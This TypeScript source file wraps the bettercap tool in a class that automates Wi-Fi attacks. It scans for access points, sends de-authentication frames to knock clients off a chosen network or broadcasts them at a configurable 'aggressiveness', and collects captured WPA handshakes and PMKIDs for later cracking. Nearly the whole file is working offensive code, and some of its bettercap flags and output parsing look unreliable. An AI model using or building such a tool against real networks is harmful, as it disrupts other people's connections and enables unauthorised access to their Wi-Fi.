import { spawn, ChildProcess } from "child_process";
import { EventEmitter } from "events";
import * as fs from "fs";
import * as path from "path";

/**
 * Bettercap Wrapper
 * Manages bettercap subprocess for Wi-Fi reconnaissance and de-authentication
 */

export interface BettercapConfig {
  interface: string;
  channel?: number;
  dwellTime?: number; // milliseconds per channel
  aggressiveness?: "low" | "medium" | "high"; // Controls de-auth intensity
  outputDir: string;
}

export interface AccessPoint {
  bssid: string;
  ssid: string;
  channel: number;
  signalStrength: number; // dBm
  encryption: string;
  clients: number;
  lastSeen: Date;
}

export interface CapturedHandshake {
  bssid: string;
  ssid: string;
  timestamp: Date;
  filePath: string;
  size: number;
}

export class BettercapWrapper extends EventEmitter {
  private process: ChildProcess | null = null;
  private config: BettercapConfig;
  private accessPoints: Map<string, AccessPoint> = new Map();
  private capturedHandshakes: CapturedHandshake[] = [];
  private isRunning = false;
  private capInterface: string;

  constructor(config: BettercapConfig) {
    super();
    this.config = config;
    this.capInterface = config.interface;

    // Create output directory if it doesn't exist
    if (!fs.existsSync(config.outputDir)) {
      fs.mkdirSync(config.outputDir, { recursive: true });
    }
  }

  /**
   * Start bettercap for Wi-Fi reconnaissance
   */
  async start(): Promise<void> {
    if (this.isRunning) {
      throw new Error("Bettercap is already running");
    }

    try {
      // Build bettercap command
      const args = this.buildBettercapArgs();

      console.log("[Bettercap] Starting with args:", args);

      this.process = spawn("bettercap", args, {
        stdio: ["pipe", "pipe", "pipe"],
        detached: false,
      });

      this.isRunning = true;

      // Handle stdout
      this.process.stdout?.on("data", (data) => {
        this.handleBettercapOutput(data.toString());
      });

      // Handle stderr
      this.process.stderr?.on("data", (data) => {
        console.error("[Bettercap] Error:", data.toString());
        this.emit("error", data.toString());
      });

      // Handle process exit
      this.process.on("exit", (code) => {
        console.log(`[Bettercap] Process exited with code ${code}`);
        this.isRunning = false;
        this.emit("stopped", code);
      });

      this.emit("started");
    } catch (error) {
      console.error("[Bettercap] Failed to start:", error);
      throw error;
    }
  }

  /**
   * Stop bettercap
   */
  async stop(): Promise<void> {
    if (!this.process || !this.isRunning) {
      throw new Error("Bettercap is not running");
    }

    try {
      // Send quit command to bettercap
      this.process.stdin?.write("quit\n");

      // Wait for process to exit
      await new Promise((resolve) => {
        const timeout = setTimeout(() => {
          if (this.process) {
            this.process.kill("SIGKILL");
          }
          resolve(null);
        }, 5000);

        this.process?.once("exit", () => {
          clearTimeout(timeout);
          resolve(null);
        });
      });

      this.isRunning = false;
      this.emit("stopped");
    } catch (error) {
      console.error("[Bettercap] Failed to stop:", error);
      throw error;
    }
  }

  /**
   * De-authenticate clients from a specific AP
   */
  async deauthenticate(bssid: string, clientMac?: string): Promise<void> {
    if (!this.process || !this.isRunning) {
      throw new Error("Bettercap is not running");
    }

    try {
      let command: string;

      if (clientMac) {
        // De-auth specific client
        command = `wifi.deauth ${bssid} ${clientMac}\n`;
      } else {
        // De-auth all clients on AP
        command = `wifi.deauth ${bssid}\n`;
      }

      this.process.stdin?.write(command);
      this.emit("deauth_sent", { bssid, clientMac });
    } catch (error) {
      console.error("[Bettercap] Failed to send de-auth:", error);
      throw error;
    }
  }

  /**
   * Get discovered access points
   */
  getAccessPoints(): AccessPoint[] {
    return Array.from(this.accessPoints.values());
  }

  /**
   * Get captured handshakes
   */
  getCapturedHandshakes(): CapturedHandshake[] {
    return this.capturedHandshakes;
  }

  /**
   * Get specific access point
   */
  getAccessPoint(bssid: string): AccessPoint | undefined {
    return this.accessPoints.get(bssid.toUpperCase());
  }

  /**
   * Build bettercap command arguments
   */
  private buildBettercapArgs(): string[] {
    const args: string[] = [];

    // Set interface
    args.push("-iface", this.capInterface);

    // Set channel (if specified)
    if (this.config.channel) {
      args.push("-channel", this.config.channel.toString());
    }

    // Enable WiFi module
    args.push("-wifi");

    // Set output directory for captures
    args.push("-caplet", this.buildCaplet());

    return args;
  }

  /**
   * Build bettercap caplet for automated operation
   */
  private buildCaplet(): string {
    const capletPath = path.join(this.config.outputDir, "savage.caplet");

    const aggressiveness = this.config.aggressiveness || "medium";
    const deauthInterval =
      aggressiveness === "low" ? 30 : aggressiveness === "medium" ? 15 : 5;

    const capletContent = `
# SAVAGE Hunting Caplet
# Auto-generated for Wi-Fi reconnaissance

# Set interface
set wifi.interface ${this.config.interface}

# Enable WiFi module
wifi.recon on

# Set output directory
set wifi.output.dir ${this.config.outputDir}

# Enable handshake capture
set wifi.handshakes.dir ${path.join(this.config.outputDir, "handshakes")}

# De-authentication settings
set wifi.deauth.interval ${deauthInterval}
set wifi.deauth.open true
set wifi.deauth.broadcast true

# Logging
set log.level info
`;

    fs.writeFileSync(capletPath, capletContent);
    return capletPath;
  }

  /**
   * Parse bettercap output and extract AP/client information
   */
  private handleBettercapOutput(output: string): void {
    const lines = output.split("\n");

    for (const line of lines) {
      // Parse AP discovery
      if (line.includes("AP") || line.includes("SSID")) {
        this.parseAPLine(line);
      }

      // Parse handshake capture
      if (line.includes("handshake") || line.includes("PMKID")) {
        this.parseHandshakeLine(line);
      }

      // Parse client association
      if (line.includes("client") || line.includes("station")) {
        this.parseClientLine(line);
      }

      // Emit raw output for debugging
      this.emit("output", line);
    }
  }

  /**
   * Parse access point information from bettercap output
   */
  private parseAPLine(line: string): void {
    // Example: [*] [AP] BSSID: AA:BB:CC:DD:EE:FF SSID: MyNetwork Channel: 6 Signal: -45dBm
    const bssidMatch = line.match(/[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}/);
    const ssidMatch = line.match(/SSID:\s*(.+?)(?:\s+Channel|\s+Signal|$)/);
    const channelMatch = line.match(/Channel:\s*(\d+)/);
    const signalMatch = line.match(/Signal:\s*(-?\d+)/);

    if (bssidMatch) {
      const bssid = bssidMatch[0].toUpperCase();
      const ssid = ssidMatch ? ssidMatch[1].trim() : "Hidden";
      const channel = channelMatch ? parseInt(channelMatch[1]) : 0;
      const signal = signalMatch ? parseInt(signalMatch[1]) : -100;

      const ap: AccessPoint = {
        bssid,
        ssid,
        channel,
        signalStrength: signal,
        encryption: "WPA2", // Default, would need more parsing
        clients: 0,
        lastSeen: new Date(),
      };

      this.accessPoints.set(bssid, ap);
      this.emit("ap_discovered", ap);
    }
  }

  /**
   * Parse handshake capture from bettercap output
   */
  private parseHandshakeLine(line: string): void {
    // Example: [*] [PMKID] BSSID: AA:BB:CC:DD:EE:FF SSID: MyNetwork
    const bssidMatch = line.match(/[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}/);
    const ssidMatch = line.match(/SSID:\s*(.+?)(?:\s*$)/);

    if (bssidMatch) {
      const bssid = bssidMatch[0].toUpperCase();
      const ssid = ssidMatch ? ssidMatch[1].trim() : "Unknown";

      // Look for handshake file
      const handshakesDir = path.join(this.config.outputDir, "handshakes");
      if (fs.existsSync(handshakesDir)) {
        const files = fs.readdirSync(handshakesDir);
        const handshakeFile = files.find((f) =>
          f.toLowerCase().includes(bssid.replace(/:/g, "").toLowerCase())
        );

        if (handshakeFile) {
          const filePath = path.join(handshakesDir, handshakeFile);
          const stats = fs.statSync(filePath);

          const handshake: CapturedHandshake = {
            bssid,
            ssid,
            timestamp: new Date(),
            filePath,
            size: stats.size,
          };

          this.capturedHandshakes.push(handshake);
          this.emit("handshake_captured", handshake);
        }
      }
    }
  }

  /**
   * Parse client/station information
   */
  private parseClientLine(line: string): void {
    // Example: [*] [Station] MAC: AA:BB:CC:DD:EE:FF SSID: MyNetwork
    const macMatch = line.match(/[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}/);
    const ssidMatch = line.match(/SSID:\s*(.+?)(?:\s*$)/);

    if (macMatch && ssidMatch) {
      const clientMac = macMatch[0].toUpperCase();
      const ssid = ssidMatch[1].trim();

      // Find associated AP
      const ap = Array.from(this.accessPoints.values()).find(
        (a) => a.ssid === ssid
      );

      if (ap) {
        ap.clients++;
        this.emit("client_discovered", {
          clientMac,
          bssid: ap.bssid,
          ssid,
        });
      }
    }
  }

  /**
   * Check if bettercap is running
   */
  isActive(): boolean {
    return this.isRunning;
  }

  /**
   * Get statistics
   */
  getStats() {
    return {
      isRunning: this.isRunning,
      accessPointsDiscovered: this.accessPoints.size,
      handshakesCaptured: this.capturedHandshakes.length,
      totalClients: Array.from(this.accessPoints.values()).reduce(
        (sum, ap) => sum + ap.clients,
        0
      ),
    };
  }
}
